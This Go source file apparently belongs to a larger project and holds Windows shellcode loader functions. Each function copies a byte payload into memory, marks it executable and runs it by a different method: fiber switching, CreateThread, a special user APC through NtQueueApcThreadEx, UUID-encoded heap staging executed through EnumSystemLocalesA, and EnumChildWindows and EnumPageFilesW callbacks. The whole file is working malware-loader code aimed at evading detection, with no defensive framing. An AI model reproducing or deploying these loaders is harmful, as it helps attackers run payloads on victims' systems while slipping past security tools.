package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLGAS_MAX_VALUE
)

func execCreateFiber(data []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	fiberAddr, _, _ := ConvertThreadToFiber.Call()

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if addr == 0 {
		panic(1)
	}

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := CreateFiber.Call(0, addr, 0)

	SwitchToFiber.Call(fiber)
	SwitchToFiber.Call(fiberAddr)
}

func execCreateThread(data []byte) {

	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(data)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	var oldProtect uint32
	windows.VirtualProtect(addr, uintptr(len(data)), windows.PAGE_EXECUTE_READ, &oldProtect)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}

func execApc(data []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(1)
	}
	if addr == 0 {
		panic(1)
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		panic(1)
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic(1)
	}
	thread, _, err := GetCurrentThread.Call()
	if err.Error() != "The operation completed successfully." {
		panic(1)
	}
	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	if err.Error() != "The operation completed successfully." {
		panic(1)
	}
}

func execUUID(data []byte) {
	uuids, err := shellcodeToUUID(data)
	if err != nil {
		panic(1)
	}

	kernel32 := windows.NewLazySystemDLL("kernel32")
	rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")

	heapCreate := kernel32.NewProc("HeapCreate")
	heapAlloc := kernel32.NewProc("HeapAlloc")
	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
	if heapAddr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))

	}
	// Allocate the heap
	addr, _, err := heapAlloc.Call(heapAddr, 0, 0x00100000)
	if addr == 0 {
		log.Fatal(fmt.Sprintf("there was an error calling the HeapAlloc function:\r\n%s", err))
	}
	addrPtr := addr
	for _, uuid := range uuids {
		// Must be a RPC_CSTR which is null terminated
		u := append([]byte(uuid), 0)

		// Only need to pass a pointer to the first character in the null terminated string representation of the UUID
		rpcStatus, _, _ := uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)

		// RPC_S_OK = 0
		if rpcStatus != 0 {
			panic(1)
		}

		addrPtr += 16
	}
	ret, _, err := enumSystemLocalesA.Call(addr, 0)
	if ret == 0 {
		panic(1)
	}

}

func execEnumChildWindows(data []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32")
	user32 := windows.NewLazySystemDLL("user32")

	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	EnumChildWindows := user32.NewProc("EnumChildWindows")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(1)
	}
	_, _, errRtlMoveMemory := RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		panic(1)
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic(1)
	}
	EnumChildWindows.Call(addr, 0)
}

func execEnumPageFiles(data []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32")
	psapi := windows.NewLazySystemDLL("psapi.dll")
	EnumPageFilesW := psapi.NewProc("EnumPageFilesW")

	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(data)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		panic(1)
	}
	_, _, errRtlMoveMemory := RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	if errRtlMoveMemory != nil && errRtlMoveMemory.Error() != "The operation completed successfully." {
		panic(1)
	}
	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(data)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		panic(1)
	}
	EnumPageFilesW.Call(addr, 0)
}
